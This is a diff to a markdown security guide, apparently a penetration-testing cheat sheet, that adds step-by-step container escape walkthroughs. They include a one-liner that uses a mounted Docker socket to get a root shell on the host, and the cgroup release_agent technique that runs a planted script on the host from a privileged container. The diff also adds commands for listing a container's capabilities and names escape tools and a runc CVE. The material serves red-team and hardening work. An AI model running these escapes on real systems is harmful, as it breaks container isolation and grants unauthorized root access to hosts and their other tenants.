@@ -23,11 +23,45 @@ cat /proc/self/status | grep CapEff
 ls -la /var/run/docker.sock
 ```
 
-## Escape vectors
+## Container escape walkthroughs
+
+**1. Mounted Docker socket -> host root (most common):**
+
+```bash
+# Inside a container that has /var/run/docker.sock mounted
+docker -H unix:///var/run/docker.sock run -it -v /:/host --privileged alpine chroot /host sh
+# You are now root on the HOST filesystem
+```
+
+**2. Privileged container -> host via cgroups release_agent:**
+
+```bash
+# --privileged gives all capabilities; abuse the cgroup notify_on_release
+d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -1))
+mkdir -p $d/w; echo 1 > $d/w/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" > $d/release_agent
+printf '#!/bin/sh\nid > /output' > /cmd; chmod +x /cmd
+sh -c "echo 0 > $d/w/cgroup.procs"   # triggers /cmd on the host
+```
+
+**3. Enumerate your own capabilities / privilege:**
+
+```bash
+capsh --print                         # what caps do I have?
+cat /proc/self/status | grep CapEff   # 0000003fffffffff = privileged
+# Look for dangerous caps: CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_DAC_READ_SEARCH
+```
+
+**4. Automated:** run `cdk evaluate` / `deepce.sh` inside the container to find all escape paths.
+
+## Escape vectors summary
 
 - Privileged container + mounted docker.sock = host root
-- CVE-specific escapes (check kernel and runc versions)
-- Writable host paths mounted into container
+- `CAP_SYS_ADMIN` / dangerous capabilities
+- Writable host paths mounted into the container (`-v /:/host`)
+- Host PID namespace (`--pid=host`) -> read other processes' memory
+- CVE-specific escapes (check kernel and `runc` versions - e.g. CVE-2019-5736)
 
 ## Tools
 
